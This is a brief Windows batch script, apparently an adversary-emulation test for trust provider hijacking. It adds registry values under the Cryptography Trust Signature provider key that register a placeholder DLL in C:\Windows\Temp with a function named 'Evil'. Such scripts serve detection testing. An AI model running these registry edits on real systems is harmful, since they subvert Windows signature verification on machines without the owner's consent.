@echo off
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust\Signature\{000C10F1-0000-0000-C000-155300300646}" /v $DLL /t REG_SZ /d C:\Windows\Temp\T1553003006.dll /f
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust\Signature\{000C10F1-0000-0000-C000-155300300646}" /v $Function /t REG_SZ /d Evil /f
echo "Evil" >> C:\Windows\Temp\T1553003006.dll